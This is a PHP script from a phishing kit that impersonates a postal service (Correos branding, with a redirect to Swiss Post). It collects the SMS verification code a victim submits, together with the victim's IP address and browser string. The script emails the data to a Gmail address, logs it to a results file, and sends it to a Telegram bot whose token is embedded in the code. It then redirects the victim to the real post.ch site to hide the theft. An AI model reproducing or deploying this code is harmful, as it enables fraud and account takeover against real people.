<?php
$zabi = getenv("REMOTE_ADDR");
$message .= "--++-----[ Correos SMS]-----++--\n";
$message .= "-------------- BY Yagami Hajar  ?-----\n";
$message .= "SMS 2 : ".$_POST['sms']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "----------------------BY Yagami Hajar ? ----------------------\n";
$subject = "Correos SMS [ " . $zabi . " ]  ";
$email = "ayou4yuo@gmail.com";
mail($email,$subject,$message);
    $text = fopen('../rzlt.txt', 'a');
fwrite($text, $message);
file_get_contents("https://api.telegram.org/bot1613181759:AAEk6Rw1JPAaLNfvK66U9zjP44eCZPfFeOo/SendMessage?chat_id=@ZER157D&text=" . urlencode($message)."" );
header("Location: https://www.post.ch/");
?>